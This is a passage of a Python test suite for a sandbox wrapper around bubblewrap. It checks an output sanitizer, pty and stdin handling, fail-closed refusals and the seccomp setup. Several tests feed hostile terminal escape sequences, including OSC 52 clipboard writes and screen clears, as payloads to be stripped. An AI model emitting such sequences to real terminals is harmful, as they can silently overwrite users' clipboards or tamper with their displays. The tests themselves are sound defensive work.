    assert s.feed(b"A\x1bMB\x1b7C\x1b8D\x1b(BE\x1b)0F\x1b#8G\n") == "ABCDEFG\n"


def test_sanitizer_chunk_boundaries():
    """Partial sequences split across read() chunks are held back until
    complete: an SGR split three ways reassembles, a split multibyte
    character decodes once, and a stray ESC aborts a pending CSI."""
    s = sbox.OutputSanitizer()
    assert s.feed(b"\x1b") == ""
    assert s.feed(b"[3") == ""
    assert s.feed(b"1mX") == "\x1b[31mX"
    s2 = sbox.OutputSanitizer()
    assert s2.feed(b"A\x1b]0;tit") == "A"
    assert s2.feed(b"le\x07B") == "B"
    s3 = sbox.OutputSanitizer()
    assert s3.feed(b"\xe4\xb8") == ""
    assert s3.feed(b"\xad") == "中"
    s4 = sbox.OutputSanitizer()
    assert s4.feed(b"\x1b[3\x1b[31mX") == "\x1b[31mX"


def test_sanitizer_unterminated_cap_and_flush():
    """An unterminated sequence is dropped past MAX_PENDING_SEQ bytes
    (bounded memory; following text flows again), CAN/SUB abort a
    pending sequence, and flush() drops a sequence that never
    terminated while finishing a partial multibyte as U+FFFD."""
    s = sbox.OutputSanitizer()
    out = s.feed(b"\x1b]" + b"A" * (sbox.MAX_PENDING_SEQ + 900) + b"visible\n")
    assert out.endswith("visible\n") and "\x1b" not in out
    s2 = sbox.OutputSanitizer()
    assert s2.feed(b"\x1b[31\x18X\n") == "X\n"          # CAN aborts the CSI
    s3 = sbox.OutputSanitizer()
    assert s3.feed(b"ok\x1b[31") == "ok"                # never terminated
    assert s3.flush() == ""
    s4 = sbox.OutputSanitizer()
    assert s4.feed(b"\xe4") == ""                       # split multibyte...
    assert s4.flush() == "\ufffd"                       # ...badly: replaced


def test_sanitizer_split_osc_terminators():
    """BEL-terminated OSC and ST-terminated OSC both end the drop, and
    an ESC inside a string that is NOT a ST (ESC \\) resumes string
    content instead of escaping the filter."""
    s = sbox.OutputSanitizer()
    assert s.feed(b"\x1b]0;a\x1b[31mbel-not-st\x07tail\n") == "tail\n"
    s2 = sbox.OutputSanitizer()
    assert s2.feed(b"\x1b]52;c;e\x1b\\ok\n") == "ok\n"


def test_copy_winsize_across_ptys():
    """_copy_winsize forwards TIOCGWINSZ->TIOCSWINSZ between real fds
    (the SIGWINCH forwarding path), rows/cols pixel fields included."""
    import fcntl
    import pty as pty_mod
    import struct
    import termios as termios_mod
    try:
        m1, s1 = pty_mod.openpty()
        m2, s2 = pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")
    try:
        fcntl.ioctl(s1, termios_mod.TIOCSWINSZ, struct.pack("HHHH", 47, 111, 3, 4))
        sbox._copy_winsize(s1, m2)
        ws = fcntl.ioctl(s2, termios_mod.TIOCGWINSZ, b"\x00" * 8)
        assert struct.unpack("HHHH", ws) == (47, 111, 3, 4), ws
    finally:
        for fd in (m1, s1, m2, s2):
            os.close(fd)


def test_sanitizer_pty_roundtrip():
    """End to end over a real pty pair (no bwrap needed): a child writes
    hostile output to the slave; the filtered master stream keeps text
    and SGR, drops the OSC 52 clipboard write. The slave's line
    discipline translates \n to \r\n (ONLCR) — both bytes are allowed."""
    import pty as pty_mod
    payload = (b"\x1b]52;c;c3RhbGUgdGhlIGNsaXBib2FyZA==\x07BEFORE "
               b"\x1b[31mred\x1b[0m AFTER\x1b[2J\n")
    try:
        master, slave = pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")
    import subprocess as sp
    proc = sp.Popen([sys.executable, "-c",
                     "import os,sys; os.write(1, sys.stdin.buffer.read())"],
                    stdin=sp.PIPE, stdout=slave, stderr=slave, close_fds=True)
    os.close(slave)
    proc.stdin.write(payload)
    proc.stdin.close()
    sanitizer = sbox.OutputSanitizer()
    chunks = []
    while True:
        try:
            data = os.read(master, 65536)
        except OSError:  # EIO: child exited, no slave fds left
            break
        if not data:
            break
        chunks.append(sanitizer.feed(data))
    rc = proc.wait()
    os.close(master)
    assert rc == 0
    out = "".join(chunks)
    assert "\x1b]52" not in out and "\x1b[2J" not in out, repr(out)
    assert "BEFORE \x1b[31mred\x1b[0m AFTER" in out.replace("\r\n", "\n"), repr(out)


def test_run_sandbox_filter_output_end_to_end():
    """The full --filter-output pipeline without real namespaces: a fake
    bwrap (skips its flags, execs the payload) still exercises the real
    run_sandbox — pty allocation, slave-only stdio, the select pump,
    filtering, drain and cleanup. Skips when ptys are unavailable. A
    real bwrap adds the namespaces on top; the host-side path is the
    same code."""
    import io
    import contextlib
    import signal
    import subprocess as sp
    import tempfile as tf
    import pty as pty_mod
    try:
        pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")
    with tf.TemporaryDirectory(prefix="sbox-test.") as tmp:
        shim = os.path.join(tmp, "bwrap")
        with open(shim, "w", encoding="utf-8") as fh:
            fh.write('#!/bin/sh\nwhile [ "$1" != "--" ]; do shift; done\nshift\nexec "$@"\n')
        os.chmod(shim, 0o755)
        # printf octal escapes only (\033, \a): dash's builtin is POSIX.
        command = ["/bin/sh", "-c", "printf 'hi\\033]52;c;Zm9v\\a\\033[31mred\\033[0m\\n'"]
        opts = argparse.Namespace(net=True, home=False, gui=False, ssh_agent=False,
                                  ro_cwd=True, bind=[], ro_bind=[], bind_socket=[],
                                  no_seccomp=True, verbose=False,
                                  filter_output=True)
        saved_path = os.environ["PATH"]
        # run_sandbox swaps signal handlers to SIG_IGN during cleanup:
        # keep the runner's handlers intact across the call.
        saved_sigs = {s: signal.getsignal(s) for s in
                      (signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGWINCH)}
        out = io.StringIO()
        devnull = open(os.devnull, "r")
        saved_stdin = sys.stdin
        try:
            os.environ["PATH"] = tmp + os.pathsep + saved_path
            # stdin from /dev/null: deterministic (non-tty stdin is
            # inherited directly by the sandbox now; nothing is pumped).
            sys.stdin = devnull
            with contextlib.redirect_stdout(out):
                rc = sbox.run_sandbox(opts, command, [], None)
        finally:
            sys.stdin = saved_stdin
            devnull.close()
            os.environ["PATH"] = saved_path
            for s, h in saved_sigs.items():
                signal.signal(s, h)
        assert rc == 0, rc
        # OSC 52 clipboard write stripped, SGR kept, \n ONLCR'd to \r\n
        # by the slave line discipline (both bytes allowed).
        assert out.getvalue() == "hi\x1b[31mred\x1b[0m\r\n", repr(out.getvalue())


def test_run_sandbox_filter_output_pipe_stdin():
    """Piped stdin must keep flowing under --filter-output — inherited
    directly by the sandbox as the EXACT fd sys.stdin wraps (decided on
    that fd, never a blind inherit of fd 0), NOT pumped through the pty:
    EOF arrives as a real EOF on the pipe, and the slave must not echo
    piped data back into the output (nothing is ever written to the
    master)."""
    import io
    import contextlib
    import signal
    import tempfile as tf
    import pty as pty_mod
    try:
        pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")
    with tf.TemporaryDirectory(prefix="sbox-test.") as tmp:
        shim = os.path.join(tmp, "bwrap")
        with open(shim, "w", encoding="utf-8") as fh:
            fh.write('#!/bin/sh\nwhile [ "$1" != "--" ]; do shift; done\nshift\nexec "$@"\n')
        os.chmod(shim, 0o755)
        command = ["/bin/sh", "-c", "cat; echo DONE"]
        opts = argparse.Namespace(net=True, home=False, gui=False, ssh_agent=False,
                                  ro_cwd=True, bind=[], ro_bind=[], bind_socket=[],
                                  no_seccomp=True, verbose=False,
                                  filter_output=True)
        saved_path = os.environ["PATH"]
        saved_sigs = {s: signal.getsignal(s) for s in
                      (signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGWINCH)}
        pipe_r, pipe_w = os.pipe()
        out = io.StringIO()
        saved_stdin = sys.stdin
        try:
            os.environ["PATH"] = tmp + os.pathsep + saved_path
            os.write(pipe_w, b"hello pipe\n")
            os.close(pipe_w)  # EOF reaches the child directly on the pipe
            # non-tty sys.stdin: no raw mode, and _filter_child_stdin hands
            # the child THIS fd (not the runner's fd 0) — that is the point
            sys.stdin = open(pipe_r, "rb", closefd=False)
            with contextlib.redirect_stdout(out):
                rc = sbox.run_sandbox(opts, command, [], None)
        finally:
            sys.stdin.close()
            sys.stdin = saved_stdin
            os.close(pipe_r)
            os.environ["PATH"] = saved_path
            for s, h in saved_sigs.items():
                signal.signal(s, h)
        assert rc == 0, rc
        assert out.getvalue() == "hello pipe\r\nDONE\r\n", repr(out.getvalue())


def test_filter_output_refuses_unraw_tty():
    """FAIL CLOSED: if stdin IS a terminal but raw mode could not be
    entered, the sandbox must never get the host tty fd — a
    shell-launched process's tty fd is O_RDWR, so write(0, ...) would
    reach the terminal emulator UNFILTERED (OSC 52 et al.) and read()
    would see keystrokes. The old code blindly inherited fd 0 here.
    Simulated with a real pty slave as sys.stdin and tty.setraw patched
    to fail (the hung-up-tty case)."""
    import contextlib
    import io
    import signal
    import tempfile as tf
    import termios as termios_mod
    import tty as tty_mod
    import pty as pty_mod
    try:
        master, slave = pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")
    with tf.TemporaryDirectory(prefix="sbox-test.") as tmp:
        shim = os.path.join(tmp, "bwrap")
        with open(shim, "w", encoding="utf-8") as fh:
            fh.write('#!/bin/sh\nwhile [ "$1" != "--" ]; do shift; done\nshift\nexec "$@"\n')
        os.chmod(shim, 0o755)
        opts = argparse.Namespace(net=True, home=False, gui=False, ssh_agent=False,
                                  ro_cwd=True, bind=[], ro_bind=[], bind_socket=[],
                                  no_seccomp=True, verbose=False,
                                  filter_output=True)
        saved_path = os.environ["PATH"]
        saved_sigs = {s: signal.getsignal(s) for s in
                      (signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGWINCH)}
        saved_stdin = sys.stdin
        saved_setraw = tty_mod.setraw
        before = set(os.listdir("/tmp"))

        def broken_setraw(_fd, _when=termios_mod.TCSANOW):
            raise termios_mod.error("simulated hung-up tty")

        errbuf = io.StringIO()
        spawned = os.path.join(tmp, "spawned")
        try:
            os.environ["PATH"] = tmp + os.pathsep + saved_path
            tty_mod.setraw = broken_setraw          # raw mode fails...
            sys.stdin = os.fdopen(slave, "rb")      # ...on a REAL tty fd
            with contextlib.redirect_stderr(errbuf):
                try:
                    sbox.run_sandbox(opts, ["/bin/sh", "-c", f"touch {spawned}"], [], None)
                except SystemExit:
                    pass
                else:
                    raise AssertionError("an un-rawable host tty was handed to the sandbox")
        finally:
            tty_mod.setraw = saved_setraw
            sys.stdin.close()
            sys.stdin = saved_stdin
            os.close(master)
            os.environ["PATH"] = saved_path
            for s, h in saved_sigs.items():
                signal.signal(s, h)
        assert "refusing to hand the host tty" in errbuf.getvalue(), errbuf.getvalue()
        assert not os.path.exists(spawned), "the payload ran despite the refusal"
        leaked = {d for d in set(os.listdir("/tmp")) - before if d.startswith("sbox.")}
        assert not leaked, f"$WORK leaked: {leaked}"


def test_filter_output_early_unconfigurable_tty():
    """The fail-FAST mirror (_check_filter_stdin_early): a terminal stdin
    whose tcgetattr already fails dies at the TOP of run_sandbox — before
    the proxy, the self-test or the pty exist — and is unit-checkable
    directly (patched tcgetattr; a real hung-up tty behaves the same)."""
    import contextlib
    import io
    import termios as termios_mod
    import pty as pty_mod
    try:
        master, slave = pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")

    class FakeStdin:
        def fileno(self):
            return slave

    saved_stdin = sys.stdin
    saved_tcgetattr = sbox.termios.tcgetattr
    sys.stdin = FakeStdin()

    def broken_tcgetattr(_fd):
        raise termios_mod.error("simulated hang-up (EIO)")

    buf = io.StringIO()
    try:
        sbox.termios.tcgetattr = broken_tcgetattr
        with contextlib.redirect_stderr(buf):
            try:
                sbox._check_filter_stdin_early()
            except SystemExit:
                pass
            else:
                raise AssertionError("an unconfigurable tty stdin passed the early check")
    finally:
        sbox.termios.tcgetattr = saved_tcgetattr
        sys.stdin = saved_stdin
        os.close(master)
        os.close(slave)
    assert "refusing to hand the host tty" in buf.getvalue(), buf.getvalue()


def test_filter_output_stdin_none_gets_devnull():
    """sys.stdin can be None (closed/embedded interpreters): _enter_raw_mode
    used to let the AttributeError escape (an uncaught crash), and a blind
    fd-0 inherit after that could pass a terminal. Now the sandbox gets
    /dev/null and the run proceeds normally."""
    import io
    import contextlib
    import signal
    import tempfile as tf
    import pty as pty_mod
    try:
        pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")
    with tf.TemporaryDirectory(prefix="sbox-test.") as tmp:
        shim = os.path.join(tmp, "bwrap")
        with open(shim, "w", encoding="utf-8") as fh:
            fh.write('#!/bin/sh\nwhile [ "$1" != "--" ]; do shift; done\nshift\nexec "$@"\n')
        os.chmod(shim, 0o755)
        opts = argparse.Namespace(net=True, home=False, gui=False, ssh_agent=False,
                                  ro_cwd=True, bind=[], ro_bind=[], bind_socket=[],
                                  no_seccomp=True, verbose=False,
                                  filter_output=True)
        saved_path = os.environ["PATH"]
        saved_sigs = {s: signal.getsignal(s) for s in
                      (signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGWINCH)}
        saved_stdin = sys.stdin
        out = io.StringIO()
        try:
            os.environ["PATH"] = tmp + os.pathsep + saved_path
            sys.stdin = None
            # `cat` first: it must see /dev/null, hit EOF immediately and
            # exit 0 (an inherited pipe/tty would block or misread)
            with contextlib.redirect_stdout(out):
                rc = sbox.run_sandbox(opts, ["/bin/sh", "-c", "cat; printf 'done\\n'"], [], None)
        finally:
            sys.stdin = saved_stdin
            os.environ["PATH"] = saved_path
            for s, h in saved_sigs.items():
                signal.signal(s, h)
        assert rc == 0, rc
        assert out.getvalue() == "done\r\n", repr(out.getvalue())


def test_run_sandbox_filter_output_binary_pipe_stdin():
    """Binary and long-line piped stdin round-trips byte-exact under
    --filter-output: the pty path fed non-tty bytes to the slave's
    CANONICAL line discipline — NULs and control bytes eaten as ^D/^U/^W/
    ^V/^R editing, \\r turned into \\n (ICRNL), ^C/^Z/^^ eaten by ISIG,
    lines over 4095 bytes truncated, slow consumers lost bytes past the
    pending cap. The inherited pipe carries none of that — even past the
    64K pipe-buffer limit (the writer thread blocks until the payload
    drains it). cksum inside proves byte-exactness without printing
    non-printable bytes (the OUTPUT filter would legitimately drop
    those)."""
    import io
    import contextlib
    import signal
    import subprocess as sp
    import tempfile as tf
    import threading
    import pty as pty_mod
    try:
        pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")
    data = (b"\x00\x01\x02\x03\x04\x7f\x08\x15\x17\x12\x16\x0b\x0c"
            + b"A" * 8000 + b"\r\n"                       # > the 4095-byte N_TTY line
            + b"\x04\x03\r\x7f" * 512                     # EOF/SIGINT/CR/DEL blocks
            + b"B" * 65536                                # past the pipe buffer: backpressure
            + bytes(range(1, 256)) + b"\n"                # every byte except NUL...
            + b"\x00\x00\x00\n")                          # ...and NULs too
    expected = sp.run(["cksum"], input=data, capture_output=True).stdout  # "CRC SIZE\n"
    if not expected:
        raise unittest.SkipTest("cksum not available")
    expected = sp.run(["cksum"], input=data, capture_output=True).stdout  # "CRC SIZE\n"
    with tf.TemporaryDirectory(prefix="sbox-test.") as tmp:
        shim = os.path.join(tmp, "bwrap")
        with open(shim, "w", encoding="utf-8") as fh:
            fh.write('#!/bin/sh\nwhile [ "$1" != "--" ]; do shift; done\nshift\nexec "$@"\n')
        os.chmod(shim, 0o755)
        command = ["cksum"]
        opts = argparse.Namespace(net=True, home=False, gui=False, ssh_agent=False,
                                  ro_cwd=True, bind=[], ro_bind=[], bind_socket=[],
                                  no_seccomp=True, verbose=False,
                                  filter_output=True)
        saved_path = os.environ["PATH"]
        saved_sigs = {s: signal.getsignal(s) for s in
                      (signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGWINCH)}
        pipe_r, pipe_w = os.pipe()
        out = io.StringIO()
        saved_stdin = sys.stdin

        def feed_pipe():
            try:
                os.write(pipe_w, data)   # blocks past the 64K pipe buffer
            finally:
                os.close(pipe_w)         # EOF once every byte is written

        writer = threading.Thread(target=feed_pipe, daemon=True)
        try:
            os.environ["PATH"] = tmp + os.pathsep + saved_path
            writer.start()
            sys.stdin = open(pipe_r, "rb", closefd=False)  # child gets THIS fd
            with contextlib.redirect_stdout(out):
                rc = sbox.run_sandbox(opts, command, [], None)
            writer.join(5)
        finally:
            sys.stdin.close()
            sys.stdin = saved_stdin
            os.close(pipe_r)
            os.environ["PATH"] = saved_path
            for s, h in saved_sigs.items():
                signal.signal(s, h)
        assert rc == 0, rc
        assert not writer.is_alive(), "writer thread stuck: payload never drained the pipe"
        # cksum's own output is printable and ends with \n -> ONLCR \r\n
        assert out.getvalue() == expected.decode().replace("\n", "\r\n"), (
            repr(out.getvalue()), expected)


def test_run_sandbox_seccomp_fd_end_to_end():
    """The fail-closed seccomp handoff without real namespaces: a fake
    bwrap (skips its flags, execs the payload) still exercises the real
    run_sandbox path — filter compiled, pipe written, --add-seccomp-fd
    plus --disable-userns in the argv, pin fds passed via pass_fds and
    closed after the spawn, payload exit code propagated. A REAL bwrap
    additionally applies the filter (tests/test_seccomp.py probes that
    end to end)."""
    import contextlib
    import io
    import signal
    import tempfile as tf
    import pty as pty_mod
    try:
        pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")
    with tf.TemporaryDirectory(prefix="sbox-test.") as tmp:
        log = os.path.join(tmp, "argv.log")
        shim = os.path.join(tmp, "bwrap")
        with open(shim, "w", encoding="utf-8") as fh:
            fh.write('#!/bin/sh\n'
                     'for a in "$@"; do [ "$a" = "--" ] && break; '
                     'printf "%s\\n" "$a"; done >"$SBWRAP_ARGV_LOG"\n'
                     'while [ "$1" != "--" ]; do shift; done\n'
                     'shift\n'
                     'exec "$@"\n')
        os.chmod(shim, 0o755)
        opts = argparse.Namespace(
            net=True, home=False, gui=False, ssh_agent=False, ro_cwd=False,
            bind=[tmp], ro_bind=[], bind_socket=[],
            no_seccomp=False, verbose=False, filter_output=False,
            _bwrap_caps={"seccomp": "--add-seccomp-fd", "disable_userns": True,
                         "bind_fd": True})
        command = ["/bin/sh", "-c", "exit 7"]
        saved_path = os.environ["PATH"]
        saved_sigs = {s: signal.getsignal(s) for s in
                      (signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGWINCH)}
        errbuf = io.StringIO()
        try:
            os.environ["PATH"] = tmp + os.pathsep + saved_path
            os.environ["SBWRAP_ARGV_LOG"] = log
            with contextlib.redirect_stderr(errbuf):
                rc = sbox.run_sandbox(opts, command, [], None)
        finally:
            os.environ["PATH"] = saved_path
            del os.environ["SBWRAP_ARGV_LOG"]
            for s, h in saved_sigs.items():
                signal.signal(s, h)
        assert rc == 7, rc
        argv = open(log, encoding="utf-8").read().splitlines()
        assert argv[0] == "--add-seccomp-fd", argv  # hardening leads the argv
        assert argv[1].isdigit(), argv              # the pipe fd number
        assert "--disable-userns" in argv and "--assert-userns-disabled" in argv, argv
        assert "--bind-fd" in argv, argv            # the user bind, pinned


def test_sanitizer_c0_inside_escape_sequence():
    """A stray ESC must not eat the newline: real terminals EXECUTE C0
    controls even inside a pending escape sequence (VT parsers run them),
    so \\n/\\r/\\t interleaved after an ESC (or inside a CSI body) pass
    through while the filter keeps waiting for the sequence — previously
    the \\n was swallowed AND the next printable character got consumed
    as the sequence's final byte. Other C0s still drop; strict_cr defers
    an interleaved \\r exactly like a plain-text one."""
    s = sbox.OutputSanitizer()
    assert s.feed(b"a\x1b\nbc") == "a\nc"        # 'b' completes ESC-b: dropped
    s = sbox.OutputSanitizer()
    assert s.feed(b"a\x1b\n\x1b[31mX\n") == "a\n\x1b[31mX\n"
    # \t inside a CSI body: executed, body continues, non-SGR final drops
    s = sbox.OutputSanitizer()
    assert s.feed(b"\x1b[\tx\r\n") == "\t\r\n"
    # other C0s ( BEL, NUL) drop without ending the wait
    s = sbox.OutputSanitizer()
    assert s.feed(b"\x1b\x07\x00[31mZ\n") == "\x1b[31mZ\n"
    # strict_cr: interleaved \r defers — \r\n passes, bare \r drops
    s = sbox.OutputSanitizer(strict_cr=True)
    assert s.feed(b"\x1b\r\nZ") == "\r\n"        # 'Z' completes the 2-byte ESC: dropped
    s = sbox.OutputSanitizer(strict_cr=True)
    assert s.feed(b"\x1b\rb\n") == "\n"


def test_sanitizer_boundary_equivalence():
    """Chunked delivery must filter identically to one-shot: the spec's
    load-bearing reason is read() boundaries, so every possible split
    point (and a few random multi-splits) is checked against the
    whole-stream result — in default AND strict_cr mode (strict \r
    handling holds a byte of lookahead, which must not leak state that a
    one-shot feed would not have)."""
    import random
    data = (b"A\x1b[31mB\x1b[0m C\x1b]0;t\x07D\x1b[8mE\xe4\xb8\xadF\x1b[2JG"
            b"\x1bP1;2q\x1b\\H\x1bM I\x1b[99999999999999999999999999999999m"
            b"J\x1b]8;;u\x1b\\K\n\r\t\x1b(BL\rM\r\r\nN\r"
            # stray ESC interleaved with executed C0s (see
            # test_sanitizer_c0_inside_escape_sequence) — the split must
            # stay invariant for these too
            b"\x1b\n\x1b[\t\x07xO\x1b\rP")
    for strict in (False, True):
        one = sbox.OutputSanitizer(strict_cr=strict).feed(data)
        if not strict:
            assert one.endswith("L\rM\r\r\nN\r\n\tO\r")  # default keeps bare \r
        else:
            assert one.endswith("LM\r\nN\n\tO")          # strict drops them
        for cut in range(1, len(data)):
            s = sbox.OutputSanitizer(strict_cr=strict)
            assert s.feed(data[:cut]) + s.feed(data[cut:]) == one, (strict, cut)
        random.seed(1234)  # deterministic multi-split fuzz
        for _ in range(50):
            s, pos, out = sbox.OutputSanitizer(strict_cr=strict), 0, ""
            while pos < len(data):
                step = random.randint(1, 7)
                out += s.feed(data[pos:pos + step])
                pos += step
            assert out == one, strict


def _main():
    import traceback
    tests = [(n, f) for n, f in sorted(globals().items())
             if n.startswith("test_") and callable(f)]
    failed = skipped = 0
    for name, fn in tests:
        try:
            fn()
        except unittest.SkipTest as e:
            skipped += 1
            print(f"SKIP  {name}: {e}")
        except SystemExit as e:
            failed += 1
            print(f"FAIL  {name}: unexpected die()/exit({e.code}) escaped the test")
        except Exception:
            failed += 1
            print(f"FAIL  {name}")
            traceback.print_exc()
        else:
            print(f"PASS  {name}")
    total = len(tests)
    print(f"\n{total} tests: {total - failed - skipped} passed, "
          f"{skipped} skipped, {failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(_main())
